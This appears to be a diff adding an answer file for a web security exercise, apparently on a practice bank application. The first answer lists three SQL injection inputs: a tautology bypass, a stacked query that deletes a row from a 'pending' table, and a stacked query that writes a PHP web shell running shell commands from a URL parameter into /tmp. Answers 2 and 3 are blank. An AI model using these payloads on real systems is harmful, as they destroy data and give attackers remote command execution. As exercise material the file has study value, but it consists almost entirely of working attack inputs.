@@ -1,0 +1,9 @@
+1) 12 or 1=1
+
+12; DELETE FROM pending WHERE id=9;
+
+12; SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/tmp/safeBank.php'
+
+2)
+
+3)
